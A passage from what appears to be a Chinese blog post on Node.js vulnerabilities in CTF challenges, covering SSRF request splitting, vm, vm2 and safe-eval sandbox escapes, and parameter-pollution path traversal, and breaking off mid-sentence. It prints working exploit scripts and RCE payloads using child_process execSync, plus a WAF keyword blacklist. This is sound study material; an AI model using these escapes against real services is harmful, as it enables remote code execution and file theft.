require(&#39;path&#39;); // 处理文件路径 var http = require(&#39;http&#39;); var pug = require(`pug`); // 模板渲染 var morgan = require(&#39;morgan&#39;); // 日志 const multer = require(&#39;multer&#39;); // 用于处理multipart/form-data类型的表单数据，实现上传功能// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组 app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;)); // 使用简化版日志 app.use(morgan(&#39;short&#39;));  // 静态文件路由 app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#39;/uploads&#39;))) app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#39;/template&#39;)))  app.get(&#39;/&#39;, function (req, res) &#123;      // GET方法获取action参数      var action = req.query.action ? req.query.action : &quot;index&quot;;      // action中不能包含/ &amp; \      if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;            res.send(&quot;Errrrr, You have been Blocked&quot;);      &#125;        // 将/template/[action].pug渲染成html输出到根目录      file = path.join(__dirname + &#39;/template/&#39; + action + &#39;.pug&#39;);      var html = pug.renderFile(file);      res.send(html); &#125;);  app.post(&#39;/file_upload&#39;, function (req, res) &#123;      var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接      var obj = &#123;msg: &#39;&#39;,&#125;      // 请求必须来自localhost      if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;            obj.msg = &quot;only admin&#39;s ip can use it&quot;            res.send(JSON.stringify(obj));            return      &#125;      fs.readFile(req.files[0].path, function (err, data) &#123;            if (err) &#123;                  obj.msg = &#39;upload failed&#39;;                  res.send(JSON.stringify(obj));            &#125; else &#123;                  // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面                  var file_path = &#39;/uploads/&#39; + req.files[0].mimetype + &quot;/&quot;;                  var file_name = req.files[0].originalname                  var dir_file = __dirname + file_path + file_name                  if (!fs.existsSync(__dirname + file_path)) &#123;                        try &#123;                              fs.mkdirSync(__dirname + file_path)                        &#125; catch (error) &#123;                              obj.msg = &quot;file type error&quot;;                              res.send(JSON.stringify(obj));                              return                        &#125;                  &#125;                  try &#123;                        fs.writeFileSync(dir_file, data)                        obj = &#123;msg: &#39;upload success&#39;, filename: file_path + file_name&#125;                  &#125; catch (error) &#123;                        obj.msg = &#39;upload failed&#39;;                  &#125;                  res.send(JSON.stringify(obj));            &#125;      &#125;) &#125;)  // 查看题目源码 app.get(&#39;/source&#39;, function (req, res) &#123;      res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;)); &#125;);  app.get(&#39;/core&#39;, function (req, res) &#123;      var q = req.query.q;      var resp = &quot;&quot;;      if (q) &#123;            var url = &#39;http://localhost:8081/source?&#39; + q            console.log(url)               // 对url字符进行waf            var trigger = blacklist(url);            if (trigger === true) &#123;                  res.send(&quot;error occurs!&quot;);            &#125; else &#123;                  try &#123;                              // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                        http.get(url, function (resp) &#123;                              resp.setEncoding(&#39;utf8&#39;);                              resp.on(&#39;error&#39;, function (err) &#123;                                    if (err.code === &quot;ECONNRESET&quot;) &#123;                                          console.log(&quot;Timeout occurs&quot;);                                    &#125;                              &#125;);                                        // 返回结果输出到/core                              resp.on(&#39;data&#39;, function (chunk) &#123;                                    try &#123;                                          resps = chunk.toString();                                          res.send(resps);                                    &#125; catch (e) &#123;                                          res.send(e.message);                                    &#125;                              &#125;).on(&#39;error&#39;, (e) =&gt; &#123;                                    res.send(e.message);                              &#125;);                        &#125;);                  &#125; catch (error) &#123;                        console.log(error);                  &#125;            &#125;      &#125; else &#123;            res.send(&quot;search param &#39;q&#39; missing!&quot;);      &#125; &#125;)  // 关键字waf 利用字符串拼接实现绕过 function blacklist(url) &#123;      var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#39;&quot;, &quot;!&quot;];      var arrayLen = evilwords.length;       for (var i = 0; i &lt; arrayLen; i++) &#123;            const trigger = url.includes(evilwords[i]);            if (trigger === true) &#123;                  return true            &#125;      &#125; &#125;  var server = app.listen(8081, function () &#123;      var host = server.address().address      var port = server.address().port      console.log(&quot;Example app listening at http://%s:%s&quot;, host, port) &#125;)</code></pre><p><strong>exp:</strong></p><pre><code class="plsql">import requestspayload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lmonstergg.pug&quot;Content-Type: ../template-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)payload = payload.format(len(body), body) \    .replace(&#39;+&#39;, &#39;\u012b&#39;)             \    .replace(&#39; &#39;, &#39;\u0120&#39;)             \    .replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;)    \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;)             \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;)             \    .replace(&#39;[&#39;, &#39;\u015b&#39;)             \    .replace(&#39;]&#39;, &#39;\u015d&#39;) \    + &#39;GET&#39; + &#39;\u0120&#39; + &#39;/&#39;session = requests.Session()session.trust_env = Falseresponse1 = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/core?q=&#39; + payload)response = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/?action=lmonstergg&#39;)print(response.text)</code></pre><h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p><strong>context</strong><br> vm 模块创建一个V8虚拟引擎 context（上下文、环境）来编译和运行代码。  </p><pre><code class="plsql">context 是语境、环境、上下文的意思，类似于文章的语境，一句话的意思需要根据语境推断，即文章的上下文。以此类比，这里的 context 是 JavaScript 代码所处的环境（有点像作用域的概念），一条代码语句在不同的环境执行的结果也不同。</code></pre><p>调用代码与被调用代码处于不同的 context，意味着它们的 global 对象是不同的。<br>例子：</p><pre><code class="plsql">const vm = require(&#39;vm&#39;);// global下定义一个 x 变量const x = 1;// context也定义一个 x 变量const context = &#123; x: 2 &#125;;vm.createContext(context);          // 语境化 &#123;x:2&#125;// code包含的代码将在 context 下执行，所以其中所有代码访问的变量都是 context 下的const code = &#39;x += 40; var y = 17;&#39;;vm.runInContext(code, context);// context = &#123;x:42, y:17&#125;console.log(context.x); // 42console.log(context.y); // 17// global没有被改动console.log(x); // 1; y is not defined.</code></pre><p> code执行的环境是 context ，它访问的全局对象就是访问自定义的 context 对象。<br><strong>contextify 语境化</strong><br> 根据 V8 引擎的文档指明：  </p><pre><code class="plsql">在 V8 中，context 是一个执行环境，它允许在隔离的、无关联的一个 V8 实例中运行 JavaScript 应用。你必须为运行的任何JavaScript代码指定所应该处于的 context。</code></pre><p>vm.createContext() 有一个 contextobject 参数，用于接收一个对象（如果没有，就在模块内部创建一个），所谓语境化就是创建一个 context（对象） 然后传入 contextObject 作为代码执行环境的过程。  </p><h2 id="vm逃逸"><a href="#vm逃逸" class="headerlink" title="vm逃逸"></a>vm逃逸</h2><p>vm创建一个新的 context 执行 JavaScript 代码，不能访问 global 对象，看起来就像一个沙箱了。<br>例如我们想要访问 process：</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`process`);   // 默认 context = &#123;&#125;console.log(xyz);</code></pre><p>结果:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612046837-5f634418-9837-44b2-8968-28bd67220a43.png" alt="image.png"><br> 预料之中，因为 process 不存在于新的 context，它存在于原来的 context 中，而原来的 context 的 global 对象有 process 属性：  </p><pre><code class="plsql">&quot;use strict&quot;;console.log(process)</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612137486-e997e313-634b-40f6-92dc-5af7e767d1a5.png" alt="image.png"><br> 通过对象带有的 constructor 属性逃逸:</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`);console.log(xyz);  // xyz的值为最后一句JavaScript代码执行的结果，这里是函数返回值</code></pre><p>结果:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612256209-e86817c0-1c5a-441b-91e3-69fb1f2f9b16.png" alt="image.png"><br>this引用的是当前所在的一个对象，这里是传入 contextObject 的对象，它在外部定义，所以它属于外部的 context。通过 .constructor 得到 Object Contrustor ，再通过 .constructor 得到 Function constructor，这是函数的构造函数，通过传入一个包含代码的字符串参数就能创建一个新的函数，最后的 () 就是调用这个函数。<br>获得 process 之后就能 RCE 了。</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ipconfig&#39;).toString()`);console.log(xyz);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612373997-17575d9f-dd72-4406-872f-4ce4841a9ce2.png" alt="image.png"></p><h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><p>nodejs.js 内置的 vm 模块提供的沙箱环境的隔离程度不高，因此最好不要执行不受信任的代码，这一点在node.js文档中明确指出。<br>vm2是一个第三方模块，基于vm模块、Proxy特性、require重写来实现，能提供隔离程度更高的沙箱。<br> vm的例子在vm2运行：  </p><pre><code class="plsql">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);new VM().run(&#39;this.constructor.constructor(&quot;return process&quot;)()&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668613759546-ed42fac1-20b3-4915-adf8-5411de5170cd.png" alt="image.png"><br> 这次通过 this.constructor.constructor 也不能获取 process 了。这是由于 vm2 语境化了在 vm context 中的所有对象，.constructor指向的构造函数并不是外部的 context 。  </p><pre><code class="plsql">// vm&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`this.constructor.constructor`);console.log(xyz)                       // Function: Functionconsole.log(xyz === &#123;&#125;.constructor.constructor);       // true// vm2&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const xyz = new VM().run(&#39;this.constructor.constructor&#39;);console.log(xyz)                       // Function: Functionconsole.log(xyz === &#123;&#125;.constructor.constructor)        // false</code></pre><p><strong>vm2逃逸思路</strong><br>逃逸的思路：我们需要一些沙箱外的东西，它不在沙箱 context 的限制范围内，通过它就能再次访问 constructor 。<br>**1.异常处理机制 try catch 就能做到这一点，主进程在 try 抛出异常，然后在 catch 捕获 error 对象，通过这个 error 对象引用到 process **</p><pre><code>vm2 将该漏洞已修复</code></pre><pre><code class="plsql">const &#123;NodeVM&#125; = require(&#39;vm2&#39;); nvm = new NodeVM()nvm.run(`    try &#123;        this.process.removeListener();     &#125;     catch (host_exception) &#123;        console.log(&#39;host exception: &#39; + host_exception.toString());        // 通过 error 对象引用        host_constructor = host_exception.constructor.constructor;        host_process = host_constructor(&#39;return this&#39;)().process;    child_process = host_process.mainModule.require(&quot;child_process&quot;);    console.log(child_process.execSync(&quot;whoami&quot;).toString());    &#125;`);</code></pre><p> 结果：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614464966-61b06bd9-ccc9-432f-9bd1-670748257f0b.png" alt="668e27f4a4304458a6644938470fe5dc.png"><br>其他得一些payload</p><pre><code class="plsql">var handler = &#123;    get () &#123;     console.log(&quot;get&quot;);    &#125;  &#125;;var target = &#123;&#125;;var proxy = new Proxy(target, handler);Object.prototype.has = function(t, k)&#123;    console.log(&quot;has&quot;);&#125;proxy.a; //触发get&quot;&quot; in proxy; //触发has，这个has是在原型链上定义的w</code></pre><p>========================================</p><pre><code class="plsql">&quot;use strict&quot;;var process;Object.prototype.has = function (t, k) &#123;    process = t.constructor(&quot;return process&quot;)();&#125;;&quot;&quot; in Buffer.from;process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</code></pre><h2 id="safe-eval模块逃逸"><a href="#safe-eval模块逃逸" class="headerlink" title="safe-eval模块逃逸"></a>safe-eval模块逃逸</h2><p> safe-eval 第三方模块基于内置模块 vm 实现，可以用于执行 JavaScript 代码，默认能访问 V8 引擎的 JavaScript APIs，而不能访问 node.js 的 APIs，但通过传入 context 也能实现对它们的访问。  </p><pre><code class="plsql">safeEval(code, [context], [options])</code></pre><p> context 是一个包含属性和方法的对象，这些方法和属性从全局，所以要注意传入的属性和方法，否则会造成沙箱逃逸。<br> 在 version &lt;= 0.3.0 中，safe-eval 存在沙箱逃逸的漏洞：  </p><pre><code class="plsql">&gt;npm i safe-eval@0.3.0</code></pre><pre><code class="plsql">// test.jsconst safeEval = require(&#39;safe-eval&#39;)var code = `    this.constructor.constructor(&#39;return process&#39;)()`var evaluated = safeEval(code)console.log(evaluated)            // process [....]</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614691540-a0071ffe-52e2-41b4-9ac6-dfceedfa45e5.png" alt="image.png"><br> 0.4.0 的修补方法是将对象的 constructor 重新定义为 undefined，包括在 context 传入的对象：  </p><pre><code class="plsql">const safeEval = require(&#39;safe-eval&#39;)var code = &#39;this.constructor&#39;var evaluated = safeEval(code)      console.log(evaluated)             // undefinedvar code = &#39;a&#39;var evaluated2 = safeEval(code, &#123;a:&#123;&#125;)console.log(evaluated2)           // &#123;constructor: undefined&#125;</code></pre><p><strong>safe-eval  1.3.6  版本逃逸</strong></p><pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted));</code></pre><p>payload:</p><pre><code class="plsql">(function () &#123;const process = clearImmediate.constructor(&quot;return process;&quot;)();return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()&#125;)()</code></pre><h2 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h2><h3 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h3><p>链接:<a href="https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode">https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode</a><br>这里使用docker搭建<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763162126-19b5e964-48f5-4b5f-a4a4-26f95a1993e8.png" alt="image.png"></p><p>我们查看下源代码:</p><pre><code class="plsql">const express = require(&#39;express&#39;);const bodyParser = require(&#39;body-parser&#39;);const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库const fs = require(&#39;fs&#39;);const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 老板说为了后期方便优化app.use((req, res, next) =&gt; &#123;  if (req.path === &#39;/eval&#39;) &#123;    let delay = 60 * 1000;    console.log(delay);    if (Number.isInteger(parseInt(req.query.delay))) &#123;      delay = Math.max(delay, parseInt(req.query.delay));    &#125;    const t = setTimeout(() =&gt; next(), delay);    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事    setTimeout(() =&gt; &#123;      clearTimeout(t);      console.log(&#39;timeout&#39;);      try &#123;        res.send(&#39;Timeout!&#39;);      &#125; catch (e) &#123;      &#125;    &#125;, 1000);  &#125; else &#123;    next();  &#125;&#125;);app.post(&#39;/eval&#39;, function (req, res) &#123;  let response = &#39;&#39;;  if (req.body.e) &#123;    try &#123;      response = saferEval(req.body.e);    &#125; catch (e) &#123;      response = &#39;Wrong Wrong Wrong!!!!&#39;;    &#125;  &#125;  res.send(String(response));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#39;/source&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./index.js&#39;));&#125;);// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口app.get(&#39;/version&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./package.json&#39;));&#125;);app.get(&#39;/&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./index.html&#39;))&#125;)app.listen(80, &#39;0.0.0.0&#39;, () =&gt; &#123;  console.log(&#39;Start listening&#39;)&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763320589-54653302-1df5-408b-ba38-b77bdd27a991.png" alt="image.png"><br>在这段代码中存在safe-eval，我们查看下它得版本<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763363493-222cc8a3-42df-4e25-8f16-326a1bbc6154.png" alt="image.png"><br>1.3.6是存在漏洞的<br>我们先继续分析代码:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668771592322-95094a63-cbd9-4ada-a453-3c86ee7b6c50.png" alt="image.png"><br> 通过/eval?delay=上传一个数字并和60000比较，大的赋值给delay  </p><pre><code class="plsql">setTimeout最多只能推迟执行2147483647毫秒（24.8天），超过这个时间会发生溢出，导致回调函数将在当前任务队列结束后立即执行</code></pre><p> 我们传入一个大于2147483647的值即可执行next()到下一个位置<br>所以我们就可以通过get传入一个比2147483647大的值，然年使用post方式传入payload<br>safer-eval 1.3.6逃逸payload:</p><pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted));</code></pre><p>在这里我们直接给e post传入一下内容:</p><pre><code class="plsql">(function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;)()</code></pre><p>搭建的docker环境不知道为什么没有成功执行命令，放一张别人的图叭<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668772542204-bf8936f4-0bf2-48b7-9fe6-112ba4a93c59.png" alt="o_20080607581121-1.png"></p><h2 id="更多逃逸payload"><a href="#更多逃逸payload" class="headerlink" title="更多逃逸payload"></a>更多逃逸payload</h2><p><a href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a><br><a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p><h1 id="一些有趣的挑战"><a href="#一些有趣的挑战" class="headerlink" title="一些有趣的挑战"></a>一些有趣的挑战</h1><h2 id="CSIVITU-2020-File-Library"><a href="#CSIVITU-2020-File-Library" class="headerlink" title="CSIVITU 2020-File Library"></a>CSIVITU 2020-<strong>File Library</strong></h2><p>容器地址:<a href="https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library">https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library</a><br>我们得到了任务的源代码：</p><pre><code class="javascript">const express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const app = express();const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; &#123;   console.log(`Listening on port $&#123;PORT&#125;`);&#125;);app.get(&#39;/getFile&#39;, (req, res) =&gt; &#123;   let &#123; file &#125; = req.query;   console.log(&quot;file is: &quot;+file);   if (!file) &#123;       res.send(`file=$&#123;file&#125;\nFilename not specified!`);       return;   &#125;   try &#123;       if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;)) &#123;           res.send(`file=$&#123;file&#125;\nInvalid filename!`);           return;       &#125;   &#125; catch (err) &#123;       res.send(&#39;An error occured!&#39;);       return;   &#125;   if (!allowedFileType(file)) &#123;       res.send(`File type not allowed`);       return;   &#125;   if (file.length &gt; 5) &#123;       file = file.slice(0, 5);   &#125;   const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);  console.log(&quot;returnedFile: &quot;+returnedFile);   fs.readFile(returnedFile, (err) =&gt; &#123;       if (err) &#123;           if (err.code != &#39;ENOENT&#39;) console.log(err);           res.send(&#39;An error occured!&#39;);           return;       &#125;       res.sendFile(returnedFile);   &#125;);&#125;);app.get(&#39;/*&#39;, (req, res) =&gt; &#123;   res.sendFile(__dirname + &#39;/index.html&#39;);&#125;);function allowedFileType(file) &#123;   const format = file.slice(file.indexOf(&#39;.&#39;) + 1);console.log(&quot;index +1 is &quot;+file.indexOf(&#39;.&#39;) + 1);    console.log(&quot;format inside allowedfile is: &quot;+format);   if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;       return true;   &#125;   return false;&#125;</code></pre><p>我添加了一些日志记录语句以方便操作，正如您所见，当我们访问**/getfile**时，我们可以在 get 参数中提供一个将为我们显示的文件名，但有一些限制，我们不能使用空格或“/”，只允许四个扩展名 (js|ts|c|cpp) 。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668851120660-015dd3fc-8e23-42ce-86ae-08e0a10ec78c.png" alt="image.png"><br>仔细阅读源代码后，我很确定我们会使用 http 参数污染，因为没有检查 get 参数的类型，所以我们可以输入一个数组并尝试利用可能发生的不当行为。<br>假设我们输入以下数组：</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]</code></pre><ul><li><strong>第一次检查</strong>：if (file.includes(‘ ‘) || file.includes(‘/‘))</li></ul><p>当 includes 应用于数组时，它会检查是否有一个字段等于传递的参数（在我们的例子中为“”和“/”），这里为 false，因此我们可以成功通过此检查</p><ul><li><strong>第二次检查</strong>：if (!allowedFileType(file))</li></ul><p>我们来看看这个函数的代码：</p><pre><code class="javascript">function allowedFileType(file) &#123;const format = file.slice(file.indexOf(&#39;.&#39;) + 1);    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;        return true;    &#125;    return false;&#125;</code></pre><p>它将从 indexOf(“.”)+1 开始对我们的数组进行切片，所以在我们的例子中，结果将是我们数组的最后一个字段，即“js”，我们也将通过此检查：<br>以下行将删除数组的最后两个字段：</p><pre><code class="javascript">if (file.length &gt; 5) &#123;  file = file.slice(0, 5);&#125;# &quot;Welcome to GeeksforGeeks&quot;.slice(0, 5)  ---&gt; Welcom</code></pre><p>所以我们的数组将变成：</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;]</code></pre><p>最后在解析路径后 returnedFile 将包含 /proc/self/cwd/flag.txt</p><pre><code class="javascript">const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);</code></pre><p><strong>注意：</strong>由于我们的“../../”字段，当前目录的__dirname 被忽略，而**/proc/self/cwd**等同于当前目录。<br>所以最后我们的数组将被解析为我们想要的路径，这是最终的有效载荷，它只是对我们之前所说的的一种解释：</p><pre><code class="javascript">http://chall.csivit.com:30222/getfile?file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../proc/self/cwd/flag.txt&amp;file[]=.&amp;file[]=js</code></pre><h2 id="corCTF2022-a-simple-waf"><a href="#corCTF2022-a-simple-waf" class="headerlink" title="corCTF2022 a simple waf"></a>corCTF2022 a simple waf</h2><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935506091-1813cc21-6778-4925-9957-d8eec87bba05.png"><br>挑战为我们提供了<a href="https://github.com/thangpd3160/CTF-Writeup/tree/main/corCTF/2022/simplewaf">源代码</a>和一个Dockerfile. 由于 Instancer 只创建一个持续 3 分钟的挑战实例，这非常不方便，所以我使用提供的资源在本地构建和调试以玩这个挑战。<br>浏览网站localhost:3456，我们可以看到这只是一个简单的网页展示指定文件的内容。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935640897-81cac506-2e2f-4d19-ac63-515f73604c5d.png" alt="image.png"><br>这个挑战的目标是读取flag.txt文件的内容……但以某种方式绕过includes(‘flag’)waf的检查。所有的挑战代码都可以在 看到main.js</p><pre><code class="javascript">const express = require(&quot;express&quot;);const fs = require(&quot;fs&quot;);const app = express();const PORT = process.env.PORT || 3456;app.use((req, res, next) =&gt; &#123;    if([req.body, req.headers, req.query].some(        (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)    )) &#123;        return res.send(&quot;bad hacker!&quot;);    &#125;    next();&#125;);app.get(&quot;/&quot;, (req, res) =&gt; &#123;    try &#123;        res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);        res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());           &#125;    catch(err) &#123;        console.log(err);        res.status(500).send(&quot;Internal server error&quot;);    &#125;&#125;);app.listen(PORT, () =&gt; console.log(`web/simplewaf listening on port $&#123;PORT&#125;`));</code></pre><p><strong>分析</strong><br>阅读源代码后，我想到了两个问题。</p><ol><li>如何绕过includes条件？（绝对……我们正在寻找的东西），以及</li><li>readFileSync该函数可以采用什么类型的参数来读取文件？</li></ol><p>通过在 Google 上搜索，我发现了一篇关于<a href="https://ahmed-belkahla.me/post/csictf2020/">NodeJS Bypass Filter CTF</a>的文章，它在某些时候类似于这个挑战：</p><ul><li>这两个挑战都没有验证输入的类型，这意味着我们可以将输入作为数组而不是字符串传递，并且</li><li>这两个挑战都需要绕过includes函数才能到达标志！</li></ul><p>太棒了！认为我找到了正确的位置，我尝试了 payload file[]=x&amp;file[]=flag.txt。不幸的是，它无法绕过这个挑战的waf<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935762043-fff8116b-850a-4c5a-bdcd-db5e94a0d1a8.png" alt="image.png"><br>为什么它不能绕过waf？好吧，我发现这行代码的挑战之间有一个关键的不同点<br>(item) =&gt; item &amp;&amp; JSON.stringify(item).includes(“flag”)<br>simplewaf不采用原始输入来执行输入验证，而是预先将原始输入转换为 JSON 字符串<strong>。</strong>因此，该includes函数仍然可以检查转换后的字符串是否包含flag。<br>至此，我无论如何也想不出绕过这个includes函数……所以，我转到第二个问题，看看那个函数的NodeJS文档。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789510-8354252a-f6cc-463c-b632-bb7e60a1a1de.png" alt="image.png"><br>好的，所以路径参数可以是一个<string> | <Buffer> | <URL> | <integer>. 但是，请求查询值的类型始终是字符串。我们如何传入readFileSync函数 aURL或 aninteger或 a 以外的任何其他内容string？<br>起初想到，我尝试将字符串格式化为URL: <a href="http://localhost:3456/wow.html%E3%80%82%E5%80%92%E9%9C%89%EF%BC%8C%E4%B8%8D%E8%A1%8C">http://localhost:3456/wow.html。倒霉，不行</a>~</integer></URL></Buffer></string></p><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png" alt="image.png"><br>停止徒劳的猜测，我决定在<a href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">github</a>readFileSync上的 NodeJS 源代码中仔细查看该功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789036-6b7a5233-e982-4190-aaae-0a8ffc5c9972.png" alt="image.png"><br>第 469 